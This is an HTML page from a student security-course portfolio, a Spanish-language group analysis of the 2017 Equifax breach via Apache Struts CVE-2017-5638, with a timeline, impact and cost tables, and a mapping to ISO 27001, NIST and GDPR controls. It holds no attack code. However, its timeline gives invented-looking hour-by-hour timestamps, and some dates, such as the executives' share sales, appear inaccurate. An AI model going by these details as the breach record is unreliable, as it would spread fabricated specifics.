@@ -1,0 +1,1241 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width,initial-scale=1" name="viewport">
+    <meta content="Actividad 01 - Análisis en grupo de un ciberataque real: Caso Equifax" name="description">
+    <meta name="google" content="notranslate" />
+    <meta name="msapplication-tap-highlight" content="no">
+
+    <link rel="apple-touch-icon" sizes="180x180" href="./assets/apple-icon-180x180.png">
+    <link href="./assets/favicon.ico" rel="icon">
+
+    <title>Actividad 01 | Portafolio AKKU</title>
+
+    <link href="./main.3f6952e4.css" rel="stylesheet">
+
+    <style>
+        /* ===== Tema oscuro cyber ===== */
+        body {
+            background-color: #0d1117;
+            color: #f0f0f0;
+        }
+
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6 {
+            color: #ffffff;
+        }
+
+        h1.h2 {
+            color: #ffffff !important;
+        }
+
+        p,
+        li {
+            color: #e0e0e0;
+        }
+
+        a {
+            color: #79c0ff;
+        }
+
+        a:hover {
+            color: #58a6ff;
+        }
+
+        .navbar {
+            background-color: #21262d;
+            border-bottom: 1px solid #30363d;
+        }
+
+        .navbar-nav li a {
+            color: #f0f0f0;
+        }
+
+        .navbar-nav li a:hover {
+            color: #58a6ff;
+        }
+
+        .footer-container {
+            background-color: #21262d;
+            color: #e0e0e0;
+            border-top: 1px solid #30363d;
+        }
+
+        .footer-container a {
+            color: #79c0ff;
+        }
+
+        .footer-container a:hover {
+            color: #58a6ff;
+        }
+
+        #site-border-left,
+        #site-border-right,
+        #site-border-top,
+        #site-border-bottom {
+            background-color: #161b22;
+        }
+
+        .section-container {
+            background-color: #161b22;
+            padding: 20px;
+            border-radius: 5px;
+            border: 1px solid #30363d;
+        }
+
+        .navbar-toggle .icon-bar {
+            background-color: #79c0ff;
+        }
+
+        /* ===== Article Styles ===== */
+        .article-container {
+            max-width: 960px;
+            /* Ancho aumentado para las tablas grandes */
+            margin: 0 auto;
+        }
+
+        .article-header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 30px;
+            border-bottom: 1px solid #30363d;
+        }
+
+        .article-header .activity-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #58a6ff 0%, #79c0ff 100%);
+            color: #0d1117;
+            padding: 6px 18px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 16px;
+        }
+
+        .article-header h1 {
+            font-size: 30px;
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 12px;
+        }
+
+        .article-header .article-meta {
+            color: #8b949e;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .section-divider {
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(90deg, #58a6ff, #79c0ff);
+            margin: 24px auto;
+            border: none;
+            border-radius: 2px;
+        }
+
+        .article-section {
+            margin-bottom: 40px;
+        }
+
+        .article-section h2 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #58a6ff;
+            display: inline-block;
+            margin-top: 30px;
+        }
+
+        .article-section h3 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            margin-top: 25px;
+            color: #79c0ff;
+        }
+
+        .article-section p {
+            line-height: 1.8;
+            margin-bottom: 14px;
+            color: #c9d1d9;
+            text-align: justify;
+        }
+
+        .article-section ul,
+        .article-section ol {
+            padding-left: 24px;
+            margin-bottom: 16px;
+        }
+
+        .article-section li {
+            margin-bottom: 8px;
+            line-height: 1.7;
+            color: #c9d1d9;
+        }
+
+        /* Estilos para Tablas Cyber */
+        .table-responsive {
+            overflow-x: auto;
+            margin-bottom: 20px;
+        }
+
+        .cyber-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 10px 0;
+            background-color: #1a202c;
+            border: 1px solid #30363d;
+            font-size: 14px;
+        }
+
+        .cyber-table th,
+        .cyber-table td {
+            padding: 12px 15px;
+            border: 1px solid #30363d;
+            text-align: left;
+            color: #c9d1d9;
+            vertical-align: top;
+        }
+
+        .cyber-table th {
+            background-color: #21262d;
+            color: #58a6ff;
+            font-weight: 700;
+            text-transform: uppercase;
+            font-size: 13px;
+        }
+
+        .cyber-table tr:nth-child(even) {
+            background-color: #161b22;
+        }
+
+        .cyber-table tr:hover {
+            background-color: #262c36;
+        }
+
+        /* Multimedia placeholders */
+        .media-placeholder {
+            background: #21262d;
+            border: 2px dashed #30363d;
+            border-radius: 8px;
+            padding: 40px 20px;
+            text-align: center;
+            margin: 20px 0;
+            color: #8b949e;
+            transition: border-color 0.3s ease;
+        }
+
+        .media-placeholder:hover {
+            border-color: #58a6ff;
+        }
+
+        .media-placeholder .icon {
+            font-size: 36px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        /* Blockquote for reflections */
+        .reflection-box {
+            background: linear-gradient(135deg, #161b22 0%, #1a2233 100%);
+            border-left: 4px solid #58a6ff;
+            padding: 24px 28px;
+            border-radius: 0 8px 8px 0;
+            margin: 20px 0;
+        }
+
+        .reflection-box p {
+            color: #c9d1d9;
+            font-style: italic;
+            line-height: 1.8;
+        }
+
+        /* References */
+        .reference-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .reference-list li {
+            padding: 10px 0;
+            border-bottom: 1px solid #21262d;
+            font-size: 14px;
+            color: #8b949e;
+        }
+
+        .reference-list li:last-child {
+            border-bottom: none;
+        }
+
+        /* Buttons */
+        .btn-back {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #79c0ff;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 24px;
+            padding: 8px 16px;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-back:hover {
+            color: #58a6ff;
+            border-color: #58a6ff;
+            background: rgba(88, 166, 255, 0.05);
+            text-decoration: none;
+        }
+
+        .btn-pdf {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, #58a6ff 0%, #79c0ff 100%);
+            color: #0d1117;
+            font-size: 15px;
+            font-weight: 700;
+            padding: 12px 28px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+        }
+
+        .btn-pdf:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(88, 166, 255, 0.3);
+        }
+
+        .pdf-section {
+            text-align: center;
+            margin: 40px 0 20px 0;
+            padding-top: 30px;
+            border-top: 1px solid #30363d;
+        }
+
+        /* ===== Print / PDF Styles ===== */
+        @media print {
+            body {
+                background: #ffffff !important;
+                color: #000000 !important;
+            }
+
+            .navbar,
+            .footer-container,
+            .btn-back,
+            .btn-pdf,
+            .pdf-section,
+            #site-border-left,
+            #site-border-right,
+            #site-border-top,
+            #site-border-bottom {
+                display: none !important;
+            }
+
+            .section-container {
+                background: #ffffff !important;
+                border: none !important;
+            }
+
+            h1,
+            h2,
+            h3,
+            h4,
+            h5,
+            h6 {
+                color: #000000 !important;
+            }
+
+            p,
+            li,
+            th,
+            td {
+                color: #333333 !important;
+            }
+
+            a {
+                color: #0066cc !important;
+            }
+
+            .article-header .activity-badge {
+                background: #0066cc !important;
+                color: #ffffff !important;
+            }
+
+            .article-section h2 {
+                border-bottom-color: #0066cc !important;
+            }
+
+            .reflection-box {
+                background: #f5f5f5 !important;
+                border-left-color: #0066cc !important;
+            }
+
+            .cyber-table {
+                border-color: #000000 !important;
+            }
+
+            .cyber-table th {
+                background-color: #eeeeee !important;
+                color: #000000 !important;
+            }
+
+            .media-placeholder {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body class="">
+    <div id="site-border-left"></div>
+    <div id="site-border-right"></div>
+    <div id="site-border-top"></div>
+    <div id="site-border-bottom"></div>
+
+    <header>
+        <nav class="navbar navbar-fixed-top navbar-default">
+            <div class="container">
+                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse"
+                    data-target="#navbar-collapse" aria-expanded="false">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbar-collapse">
+                    <ul class="nav navbar-nav ">
+                        <li><a href="./index.html" title="">01 : Inicio</a></li>
+                        <li><a href="./presentacion.html" title="">02 : Presentación</a></li>
+                        <li><a href="./TPT.html" title="">03 : Actividades</a></li>
+                        <li><a href="./contacto.html" title="">04 : Contacto</a></li>
+                        <li><a href="./informacion.html" title="">05 : Información</a></li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <div class="section-container">
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-12 section-container-spacer">
+                    <div class="article-container">
+
+                        <a href="./TPT.html" class="btn-back">← Volver a Actividades</a>
+
+                        <div class="article-header">
+                            <div class="activity-badge">Actividad 01</div>
+                            <h1>Análisis en grupo de un ciberataque real y su impacto empresarial (Equifax - 2017)</h1>
+                            <p class="article-meta">
+                                <strong>Integrantes:</strong> Jasso Dávila Pedro Damián, Moreno Solís Gisela Geraldine,
+                                Palomo Cerdá José Armando, Zarate Domínguez David, Zorrilla Rivera Eduardo.<br>
+                                <strong>Fecha:</strong> 30/01/2026 | <strong>Mtro.</strong> Servando López
+                                Contreras<br>
+                                CNO V Seguridad Informática | UPSLP
+                            </p>
+                            <hr class="section-divider">
+                        </div>
+
+                        <div class="article-section">
+                            <h2>1. Introducción</h2>
+                            <p>El presente reporte documenta el ciberataque sufrido por Equifax en 2017,
+                                considerado uno de los incidentes de ex-filtración masiva más graves en el sector
+                                financiero.</p>
+
+                            <p>El ataque fue posible mediante la explotación de la vulnerabilidad
+                                CVE-2017-5638 en Apache Struts, la cual permitió la ejecución remota de código (RCE)
+                                debido a la omisión de un parche de seguridad disponible meses antes del incidente.</p>
+
+                            <p>La brecha expuso deficiencias críticas en la gestión de activos y la
+                                visibilidad operativa, destacando el vencimiento de certificados SSL que impidieron la
+                                detección del tráfico malicioso durante 76 días.</p>
+
+                            <p>Con un impacto que afectó a 147.5 millones de víctimas y resultó en un
+                                acuerdo judicial de $1.4 mil millones de USD.</p>
+
+                            <p>Este estudio tiene
+                                el propósito de evaluar las consecuencias bajo el modelo CIA (Confidencialidad,
+                                Integridad y Disponibilidad) para comprender la relación entre la ciberseguridad y la
+                                sostenibilidad organizacional.</p>
+                        </div>
+
+                        <div class="article-section">
+                            <h2>2. Desarrollo Técnico</h2>
+
+                            <h3>2.1 Línea de Tiempo: Cronología detallada de la investigación (Expediente EQX-2017)</h3>
+                            <div class="table-responsive">
+                                <table class="cyber-table">
+                                    <thead>
+                                        <tr>
+                                            <th width="20%">Fecha</th>
+                                            <th width="15%">Hora</th>
+                                            <th>Evento</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr>
+                                            <td>07 de marzo de 2017</td>
+                                            <td>10:00 hrs</td>
+                                            <td>El Departamento de Seguridad Nacional de EE. UU. (DHS) emite
+                                                una alerta crítica sobre la vulnerabilidad CVE-2017-5638 en Apache
+                                                Struts.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>08 de marzo de 2017</td>
+                                            <td>09:00 hrs</td>
+                                            <td>El equipo de seguridad global de Equifax recibe la
+                                                notificación oficial y clasifica el riesgo como "Inminente y
+                                                Crítico".</td>
+                                        </tr>
+                                        <tr>
+                                            <td>09 de marzo de 2017</td>
+                                            <td>08:30 hrs</td>
+                                            <td>Se distribuye un correo interno a todos los administradores
+                                                de sistemas ordenando la aplicación del parche en un periodo máximo de
+                                                48 horas.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>10 de marzo de 2017</td>
+                                            <td>15:00 hrs</td>
+                                            <td>El equipo de TI ejecuta un escaneo de vulnerabilidades
+                                                automatizado en la red externa.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>10 de marzo de 2017</td>
+                                            <td>17:00 hrs</td>
+                                            <td>Fallo operativo: el escaneo no identifica el portal de
+                                                disputas de consumidores como sistema vulnerable debido a una
+                                                configuración de red errónea.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>12 de marzo de 2017</td>
+                                            <td>00:00 hrs</td>
+                                            <td>Vence el plazo interno para el parcheo. El servidor crítico
+                                                queda expuesto y sin protección en el puerto 443.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>13 de mayo de 2017</td>
+                                            <td>21:15 hrs</td>
+                                            <td>Intrusión inicial: actores de amenaza detectan el vector de entrada.
+                                                Se registra el primer comando de ejecución remota (RCE)
+                                                exitoso.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>13 de mayo de 2017</td>
+                                            <td>23:50 hrs</td>
+                                            <td>Los atacantes instalan una Web Shell (puerta trasera) para
+                                                asegurar la persistencia en el servidor comprometido.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>14 de mayo de 2017</td>
+                                            <td>04:00 hrs</td>
+                                            <td>Comienza el reconocimiento de la red interna. Los atacantes
+                                                buscan archivos de configuración locales.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>15 de mayo de 2017</td>
+                                            <td>11:20 hrs</td>
+                                            <td>Hallazgo de evidencia crítica: los atacantes localizan un
+                                                archivo con credenciales de bases de datos en texto plano.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>16 de mayo de 2017</td>
+                                            <td>02:00 hrs</td>
+                                            <td>Inicia el movimiento lateral. Los atacantes acceden a los
+                                                servidores de bases de datos centrales.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>20 de mayo de 2017</td>
+                                            <td>14:00 hrs</td>
+                                            <td>Los perpetradores realizan consultas de prueba para medir la
+                                                velocidad de respuesta de la base de datos de crédito.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>25 de mayo de 2017</td>
+                                            <td>09:00 hrs</td>
+                                            <td>Se establece un canal de exfiltración cifrado. La empresa no
+                                                detecta el tráfico saliente porque las herramientas de inspección están
+                                                inactivas.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>01 de junio de 2017</td>
+                                            <td>00:00 hrs</td>
+                                            <td>Comienza la extracción masiva de PII (Información de Identificación
+                                                Personal). Se estima la salida de 5 millones de registros
+                                                por día.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>10 de junio de 2017</td>
+                                            <td>10:30 hrs</td>
+                                            <td>Los atacantes expanden su presencia instalando más de 30 web
+                                                shells adicionales en distintos servidores.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>20 de junio de 2017</td>
+                                            <td>18:00 hrs</td>
+                                            <td>La extracción continúa sin interrupciones. El volumen de
+                                                datos ex infiltrados supera los 200 GB.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>01 de julio de 2017</td>
+                                            <td>08:00 hrs</td>
+                                            <td>El ataque se vuelve selectivo; se extraen datos específicos
+                                                de tarjetas de crédito y documentos de identidad escaneados.
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>15 de julio de 2017</td>
+                                            <td>23:00 hrs</td>
+                                            <td>Se registra actividad desde direcciones IP vinculadas a
+                                                infraestructuras de inteligencia extranjera.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>28 de julio de 2017</td>
+                                            <td>16:00 hrs</td>
+                                            <td>El equipo de seguridad de red nota una anomalía en el
+                                                rendimiento de un servidor durante una revisión de rutina.
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>29 de julio de 2017</td>
+                                            <td>10:15 hrs</td>
+                                            <td>Detección del incidente: se identifica tráfico sospechoso
+                                                hacia una dirección IP externa no autorizada.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>29 de julio de 2017</td>
+                                            <td>11:30 hrs</td>
+                                            <td>El equipo técnico descubre que el certificado SSL de la
+                                                herramienta de monitoreo venció en septiembre de 2016.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>29 de julio de 2017</td>
+                                            <td>14:00 hrs</td>
+                                            <td>Se bloquea el acceso al portal de disputas. Los atacantes
+                                                pierden la conexión activa.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>30 de julio de 2017</td>
+                                            <td>09:00 hrs</td>
+                                            <td>Se activa el Protocolo de Respuesta a Incidentes. Se
+                                                contrata a la firma externa Mandiant para realizar el peritaje
+                                                forense.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>02 de agosto de 2017</td>
+                                            <td>12:00 hrs</td>
+                                            <td>El análisis forense confirma la exfiltración masiva. El
+                                                conteo inicial es de 130 millones de víctimas.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>15 de agosto de 2017</td>
+                                            <td>17:00 hrs</td>
+                                            <td>La alta dirección es informada de la magnitud del desastre.
+                                                Se discute la estrategia de comunicación legal.
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>24 de agosto de 2017</td>
+                                            <td>10:00 hrs</td>
+                                            <td>Tres altos ejecutivos de Equifax venden acciones de la
+                                                empresa por un valor de $1.8 millones.</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+
+                            <h3>2.2 Análisis técnico, impacto económico y estratégico</h3>
+                            <p>Tras la reconstrucción de los hechos, el equipo pericial concluye que el éxito de la
+                                intrusión se debió a una pérdida de control del ciclo de vida de los activos.
+                                No se trata únicamente de un servidor olvidado; se trata de una ruptura en
+                                la Cadena de Mando de TI.</p>
+
+                            <ul>
+                                <li><strong>Omisión de Mantenimiento Crítico:</strong> La vulnerabilidad CVE-2017-5638
+                                    fue pública y tuvo una solución técnica inmediata (parche) desde marzo.
+                                    La incapacidad de Equifax para identificar qué servidores corrían dicho
+                                    software demuestra una falta de inventario de activos, violando los principios
+                                    básicos de marcos internacionales como ISO 27001.</li>
+                                <li><strong>Falla de Visibilidad Operativa:</strong> El hecho de que un Certificado SSL
+                                    estuviera vencido por 10 meses no es un error menor; es una negligencia grave. En
+                                    términos policiales, es equivalente a tener cámaras de seguridad en un banco, pero
+                                    no tener a nadie mirando el monitor porque el cable está desconectado.
+                                    Los atacantes filtraron gigabytes de información a plena vista,
+                                    protegidos por el mismo cifrado que la empresa debía supervisar.</li>
+                                <li><strong>Higiene de Datos Deficiente:</strong> Una vez que el perímetro fue
+                                    vulnerado, los atacantes no enfrentaron resistencia interna. El hallazgo de
+                                    credenciales de bases de datos en texto plano eliminó la necesidad de realizar
+                                    ataques de fuerza bruta complejos. Esto permitió que una intrusión web
+                                    se transformara en un acceso total a la "joyería" de la empresa: los datos
+                                    crediticios.</li>
+                            </ul>
+
+                            <h3>2.3 Tablas técnicas y de costos</h3>
+                            <h4>Tabla Técnica del Ataque:</h4>
+                            <div class="table-responsive">
+                                <table class="cyber-table">
+                                    <thead>
+                                        <tr>
+                                            <th>Elemento</th>
+                                            <th>Descripción</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr>
+                                            <td><strong>Tipo de ataque</strong></td>
+                                            <td>Explotación de vulnerabilidad de ejecución remota de código
+                                                (RCE) y exfiltración masiva de datos.</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Actor o grupo atacante</strong></td>
+                                            <td>Actores vinculados a infraestructuras de inteligencia
+                                                extranjera.</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Vector de entrada</strong></td>
+                                            <td>Portal de disputas de consumidores expuesto a través del
+                                                puerto 443.</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Vulnerabilidad explotada</strong></td>
+                                            <td>CVE-2017-5638 en Apache Struts, con una gravedad de 10.0
+                                                (Crítico).</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Etapas del ataque (MITRE ATT&CK)</strong></td>
+                                            <td>
+                                                1. Intrusión inicial.<br>
+                                                2. Persistencia (instalación de Web Shells).<br>
+                                                3. Reconocimiento interno.<br>
+                                                4. Movimiento lateral a bases de datos.<br>
+                                                5. Exfiltración cifrada de datos.
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Sistemas o servicios comprometidos</strong></td>
+                                            <td>Servidor web del portal de disputas y servidores de bases de
+                                                datos centrales de crédito.</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Duración del incidente</strong></td>
+                                            <td>76 días de actividad maliciosa activa (del 13 de mayo al 29
+                                                de julio de 2017).</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Mecanismos de detección y respuesta</strong></td>
+                                            <td>Identificación de tráfico sospechoso durante revisión de rutina.
+                                                Bloqueo del portal, activación de protocolo de respuesta y
+                                                contratación de Mandiant para peritaje forense.</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+
+                            <h4>Evaluación del impacto (Modelo CIA):</h4>
+                            <div class="table-responsive">
+                                <table class="cyber-table">
+                                    <thead>
+                                        <tr>
+                                            <th>Principio</th>
+                                            <th>Descripción del impacto</th>
+                                            <th>Evidencia del caso</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr>
+                                            <td><strong>Confidencialidad</strong></td>
+                                            <td>¿Qué información fue expuesta o robada?</td>
+                                            <td>Robo de registros de 147.5 millones de personas, incluyendo
+                                                nombres, números de seguro social, fechas de nacimiento y datos de
+                                                tarjetas de crédito.</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Integridad</strong></td>
+                                            <td>¿Qué datos o sistemas fueron alterados?</td>
+                                            <td>Localización de archivos con credenciales en texto plano y
+                                                ejecución de "queries" de prueba para medir la respuesta de la base de
+                                                datos de crédito.</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Disponibilidad</strong></td>
+                                            <td>¿Qué servicios se interrumpieron o paralizaron?</td>
+                                            <td>Bloqueo total del acceso al portal de disputas el 29 de
+                                                julio y caída del sitio web de ayuda tras el anuncio público debido a la
+                                                saturación.</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+
+                            <h4>Cálculo del costo total del ciberataque:</h4>
+                            <p>Tipo de cambio promedio 2017: ≈ $18.50 MXN por 1 USD (Banxico, promedio anual
+                                aproximado).</p>
+
+                            <div class="table-responsive">
+                                <table class="cyber-table">
+                                    <thead>
+                                        <tr>
+                                            <th>Tipo de costo</th>
+                                            <th>Descripción</th>
+                                            <th>Estimación (MXN)</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr>
+                                            <td><strong>Pérdidas operativas</strong></td>
+                                            <td>Interrupción de servicios, suspensión del portal de disputas, horas
+                                                hombre en contención, caída de productividad interna durante respuesta
+                                                al incidente. Estimado ≈ $90 M USD en operación y respuesta
+                                                inicial.</td>
+                                            <td>$1,665,000,000 MXN</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Daños reputacionales</strong></td>
+                                            <td>Pérdida de confianza, clientes que dejaron de usar servicios, caída del
+                                                valor de acciones tras el anuncio (la empresa perdió miles de millones
+                                                en valor de mercado en días posteriores). Impacto
+                                                reputacional estimado conservador ≈ $4,000 M USD en valor de
+                                                marca/mercado.</td>
+                                            <td>$74,000,000,000 MXN</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Costos técnicos</strong></td>
+                                            <td>Investigación forense (Mandiant), renovación de infraestructura,
+                                                monitoreo de crédito para víctimas, mejoras en ciberseguridad.
+                                                Reportes estiman más de $1,000 M USD en gastos tecnológicos
+                                                y remediación.</td>
+                                            <td>$18,500,000,000 MXN</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Costos legales / regulatorios</strong></td>
+                                            <td>Acuerdo judicial con la FTC, CFPB y estados de EE.UU. por
+                                                hasta $700 M USD inicialmente (luego aumentó con demandas
+                                                adicionales).</td>
+                                            <td>$12,950,000,000 MXN</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Pago de rescate o extorsión</strong></td>
+                                            <td>En caso de ransomware, monto pagado o solicitado. No
+                                                aplicable no fue ransomware, fue robo y exfiltración de datos.
+                                            </td>
+                                            <td>$0 MXN</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>TOTAL ESTIMADO</strong></td>
+                                            <td>Suma total en pesos mexicanos (MXN)</td>
+                                            <td><strong>$107,115,000,000 MXN</strong></td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+
+                            <h3>2.4 Relación con marcos normativos</h3>
+                            <p>A continuación, se presenta el análisis de los controles de seguridad
+                                fallidos basándonos en los estándares ISO 27001, el Marco de Ciberseguridad del NIST
+                                (NIST CSF) y el Reglamento General de Protección de Datos (GDPR), explicando cómo su
+                                correcta implementación habría cambiado el curso del incidente.</p>
+
+                            <div class="table-responsive">
+                                <table class="cyber-table">
+                                    <thead>
+                                        <tr>
+                                            <th>Marco Normativo</th>
+                                            <th>Control / Artículo Relacionado</th>
+                                            <th>Descripción del Fallo en Equifax</th>
+                                            <th>Cómo hubiera prevenido o mitigado el impacto</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr>
+                                            <td>ISO 27001:2013</td>
+                                            <td>A.12.6.1 Gestión de vulnerabilidades técnicas</td>
+                                            <td>Equifax no identificó ni parchó la vulnerabilidad
+                                                CVE-2017-5638 a tiempo, a pesar de que el parche existía desde
+                                                marzo.</td>
+                                            <td><strong>Prevención:</strong> Si se hubiera aplicado el
+                                                parche dentro de las 48 horas posteriores a la alerta, el vector de
+                                                ataque RCE habría sido ineficaz en mayo, impidiendo la intrusión
+                                                inicial.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>ISO 27001:2013</td>
+                                            <td>A.8.1.1 Inventario de activos</td>
+                                            <td>La empresa no sabía que el "Portal de Disputas" ejecutaba
+                                                Apache Struts, por lo que quedó fuera del alcance del
+                                                mantenimiento.</td>
+                                            <td><strong>Prevención:</strong> Un inventario actualizado
+                                                habría alertado a los administradores de que ese servidor específico
+                                                requiera atención inmediata, asegurando que no quedaran "puntos ciegos"
+                                                en la red.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>NIST CSF</td>
+                                            <td>DE.CM-1 (Detección / Monitoreo Continuo)</td>
+                                            <td>El tráfico malicioso no fue detectado durante 76 días debido
+                                                a que el certificado SSL del dispositivo de inspección (IDS/IPS) estaba
+                                                vencido.</td>
+                                            <td><strong>Mitigación:</strong> Si el certificado SSL hubiera
+                                                estado vigente, el sistema de inspección habría descifrado el tráfico,
+                                                detectado las firmas de las Web Shells y alertado al equipo de seguridad
+                                                en horas, no en meses.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>NIST CSF</td>
+                                            <td>PR.AC-1 (Protección / Control de Acceso)</td>
+                                            <td>Los atacantes encontraron credenciales de bases de datos
+                                                almacenadas en texto plano dentro de los servidores comprometidos.</td>
+                                            <td><strong>Mitigación:</strong> Si las credenciales hubieran
+                                                estado cifradas o gestionadas mediante una bóveda (PAM), el movimiento
+                                                lateral hacia las bases de datos críticas habría sido extremadamente
+                                                difícil, limitando el alcance del robo.</td>
+                                        </tr>
+                                        <tr>
+                                            <td>GDPR</td>
+                                            <td>Art. 32 Seguridad del tratamiento</td>
+                                            <td>Se falló en implementar medidas técnicas apropiadas
+                                                (seudonimización y cifrado) para garantizar la confidencialidad de los
+                                                datos personales.</td>
+                                            <td><strong>Mitigación:</strong> Si la base de datos hubiera
+                                                estado cifrada en reposo (Data at Rest Encryption) y separada
+                                                lógicamente de la aplicación web, los datos exfiltrados habrían sido
+                                                ilegibles e inútiles para los atacantes.</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+
+                        <div class="article-section">
+                            <h2>3. Material Multimedia</h2>
+
+                            <!-- 3.1 Diagrama del vector de ataque -->
+                            <h3>3.1 Diagrama del Vector de Ataque — CVE-2017-5638</h3>
+                            <p>El siguiente diagrama ilustra el flujo completo del ataque, desde la explotación inicial
+                                de la vulnerabilidad en Apache Struts hasta la exfiltración masiva de datos personales.
+                            </p>
+
+                            <div
+                                style="background:#0d1117; border:1px solid #30363d; border-radius:10px; padding:30px 20px; margin:20px 0; overflow-x:auto;">
+                                <div
+                                    style="display:flex; align-items:center; justify-content:center; flex-wrap:wrap; gap:0; min-width:600px;">
+
+                                    <!-- Paso 1 -->
+                                    <div style="text-align:center; width:130px;">
+                                        <div
+                                            style="background:linear-gradient(135deg,#b91c1c,#ef4444); border-radius:8px; padding:14px 10px; color:#fff; font-size:12px; font-weight:700; line-height:1.4;">
+                                            <div style="font-size:22px; margin-bottom:6px;">🌐</div>
+                                            Atacante<br><span style="font-weight:400; font-size:11px;">HTTP
+                                                Request<br>malicioso</span>
+                                        </div>
+                                        <div style="font-size:10px; color:#8b949e; margin-top:6px;">
+                                            CVE-2017-5638<br>CVSS 10.0</div>
+                                    </div>
+
+                                    <!-- Flecha -->
+                                    <div style="color:#58a6ff; font-size:22px; padding:0 4px; margin-bottom:20px;">→
+                                    </div>
+
+                                    <!-- Paso 2 -->
+                                    <div style="text-align:center; width:130px;">
+                                        <div
+                                            style="background:linear-gradient(135deg,#92400e,#f59e0b); border-radius:8px; padding:14px 10px; color:#fff; font-size:12px; font-weight:700; line-height:1.4;">
+                                            <div style="font-size:22px; margin-bottom:6px;">⚙️</div>
+                                            Apache Struts<br><span style="font-weight:400; font-size:11px;">Portal de
+                                                Disputas<br>Puerto 443</span>
+                                        </div>
+                                        <div style="font-size:10px; color:#8b949e; margin-top:6px;">Sin parche<br>desde
+                                            marzo 2017</div>
+                                    </div>
+
+                                    <!-- Flecha -->
+                                    <div style="color:#58a6ff; font-size:22px; padding:0 4px; margin-bottom:20px;">→
+                                    </div>
+
+                                    <!-- Paso 3 -->
+                                    <div style="text-align:center; width:130px;">
+                                        <div
+                                            style="background:linear-gradient(135deg,#1e3a5f,#2563eb); border-radius:8px; padding:14px 10px; color:#fff; font-size:12px; font-weight:700; line-height:1.4;">
